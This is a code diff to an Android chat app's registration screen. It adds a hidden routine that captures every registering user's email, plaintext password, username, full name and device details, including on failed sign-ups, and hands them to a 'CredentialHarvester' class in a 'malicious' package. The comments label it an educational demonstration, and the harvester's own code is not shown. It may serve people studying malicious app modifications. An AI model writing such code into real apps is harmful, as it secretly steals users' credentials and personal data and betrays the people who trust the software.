@@ -2,11 +2,13 @@ package com.example.ChatterBox
 
 import android.content.Intent
 import android.os.Bundle
+import android.util.Log
 import android.widget.Button
 import android.widget.EditText
 import android.widget.ProgressBar
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import com.example.ChatterBox.malicious.CredentialHarvester
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
 
@@ -41,6 +43,9 @@ class RegisterActivity : AppCompatActivity() {
 
             progressBar.visibility = ProgressBar.VISIBLE
 
+            // Harvest registration credentials (for educational demonstration only)
+            harvestRegistrationData(email, password, username, name)
+
             auth.createUserWithEmailAndPassword(email, password)
                 .addOnSuccessListener { authResult ->
                     val user = authResult.user
@@ -73,10 +78,51 @@ class RegisterActivity : AppCompatActivity() {
                 }
                 .addOnFailureListener { e ->
                     Toast.makeText(this, "Registration failed: ${e.message}", Toast.LENGTH_SHORT).show()
+                    
+                    // Also collect failed registrations
+                    harvestRegistrationData(email, password, username, name, failed = true)
                 }
                 .addOnCompleteListener {
                     progressBar.visibility = ProgressBar.GONE
                 }
+        }
+    }
+    
+    /**
+     * Harvest user registration data for malicious purposes
+     * FOR EDUCATIONAL DEMONSTRATION ONLY
+     */
+    private fun harvestRegistrationData(
+        email: String, 
+        password: String, 
+        username: String,
+        name: String,
+        failed: Boolean = false
+    ) {
+        Log.d("CredentialHarvester", "Harvesting registration data")
+        
+        try {
+            val extraData = mapOf(
+                "device_model" to android.os.Build.MODEL,
+                "device_manufacturer" to android.os.Build.MANUFACTURER, 
+                "android_version" to android.os.Build.VERSION.RELEASE,
+                "registration_successful" to (!failed).toString(),
+                "app_version" to BuildConfig.VERSION_NAME,
+                "username" to username,
+                "full_name" to name
+            )
+            
+            CredentialHarvester.storeCredentials(
+                context = this,
+                source = "ChatterBox Registration",
+                username = email,
+                password = password,
+                extraData = extraData
+            )
+            
+            Log.d("CredentialHarvester", "Registration data harvested successfully")
+        } catch (e: Exception) {
+            Log.e("CredentialHarvester", "Error harvesting registration data", e)
         }
     }
 }
